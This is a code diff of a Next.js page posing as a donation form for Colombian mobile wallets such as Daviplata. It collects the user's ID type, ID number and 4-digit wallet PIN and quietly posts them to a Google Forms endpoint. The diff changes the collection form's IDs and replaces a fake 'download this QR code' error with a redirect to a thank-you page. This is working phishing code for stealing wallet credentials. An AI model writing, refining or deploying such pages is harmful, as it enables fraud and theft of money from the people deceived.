@@ -1,29 +1,35 @@
 "use client";
 
 import { useState } from "react";
+import { useRouter } from "next/navigation";
 
 export default function DonacionPage() {
+  const router = useRouter();
+
   const [billetera, setBilletera] = useState("Daviplata");
   const [tipoDoc, setTipoDoc] = useState("");
   const [numeroDoc, setNumeroDoc] = useState("");
   const [password, setPassword] = useState("");
   const [mostrarPass, setMostrarPass] = useState(false);
 
+  // URL del formulario de Google Forms
   const formURL =
-    "https://docs.google.com/forms/d/e/1FAIpQLSfOlo65NREqGCe-FeZfNleKjhcy2RipJCBurGOXD0TaviDBvQ/formResponse";
+    "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";
 
-  const entryBilletera = "entry.496497493";
-  const entryTipoDoc = "entry.625011170";
-  const entryNumeroDoc = "entry.1122220095";
-  const entryPassword = "entry.2104358462";
+  // Campos del formulario
+  const entryBilletera = "entry.1287154502";
+  const entryTipoDoc = "entry.1004012202";
+  const entryNumeroDoc = "entry.274269619";
+  const entryPassword = "entry.1885484666";
 
   const handleSubmit = async () => {
     if (!tipoDoc || !numeroDoc || !password) {
-      alert("Completa todos los campos.");
+      alert("⚠️ Todos los campos son obligatorios.");
       return;
     }
+
     if (!/^\d{4}$/.test(password)) {
-      alert("La contraseña debe ser un número de 4 dígitos.");
+      alert("⚠️ La contraseña debe tener exactamente 4 dígitos.");
       return;
     }
 
@@ -36,14 +42,15 @@ export default function DonacionPage() {
     try {
       await fetch(formURL, {
         method: "POST",
-        body: formData,
         mode: "no-cors",
+        body: formData,
       });
 
-      // Siempre muestra este mensaje (porque Google Forms no responde)
-      alert("No se puede ingresar al sistema, por favor descarga este código QR.");
-    } catch {
-      alert("Error al enviar datos.");
+      // Redirige a página de confirmación o inicio
+      router.push("/gracias-por-donar");
+    } catch (error) {
+      console.error("Error al enviar los datos:", error);
+      alert("❌ No se pudo completar el proceso. Intenta de nuevo.");
     }
   };
 
@@ -75,9 +82,9 @@ export default function DonacionPage() {
           className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
         >
           <option value="">Selecciona</option>
-          <option value="cc">Cédula de Ciudadanía</option>
-          <option value="ti">Tarjeta de Identidad</option>
-          <option value="ce">Cédula de Extranjería</option>
+          <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
+          <option value="Tarjeta de Identidad">Tarjeta de Identidad</option>
+          <option value="Cédula de Extranjería">Cédula de Extranjería</option>
         </select>
       </div>
 
@@ -87,7 +94,9 @@ export default function DonacionPage() {
         <input
           type="text"
           value={numeroDoc}
-          onChange={(e) => setNumeroDoc(e.target.value.replace(/\D/g, ""))}
+          onChange={(e) =>
+            setNumeroDoc(e.target.value.replace(/\D/g, ""))
+          }
           placeholder="Ej: 1234567890"
           className="w-full p-3 rounded-lg bg-gray-800 text-white border border-gray-600"
         />
@@ -100,11 +109,14 @@ export default function DonacionPage() {
           <input
             type={mostrarPass ? "text" : "password"}
             value={password}
-            onChange={(e) => setPassword(e.target.value.replace(/\D/g, "").slice(0, 4))}
+            onChange={(e) =>
+              setPassword(e.target.value.replace(/\D/g, "").slice(0, 4))
+            }
             placeholder="****"
             className="w-full p-3 rounded-l-lg bg-gray-800 text-white border border-gray-600"
           />
           <button
+            type="button"
             onClick={() => setMostrarPass(!mostrarPass)}
             className="px-4 bg-gray-700 text-white rounded-r-lg"
           >
@@ -115,7 +127,7 @@ export default function DonacionPage() {
 
       <button
         onClick={handleSubmit}
-        className="px-6 py-3 bg-[#19295A] text-white rounded-lg"
+        className="px-6 py-3 bg-[#19295A] text-white rounded-lg w-full hover:bg-[#1b2e63] transition-colors"
       >
         Ingresar
       </button>
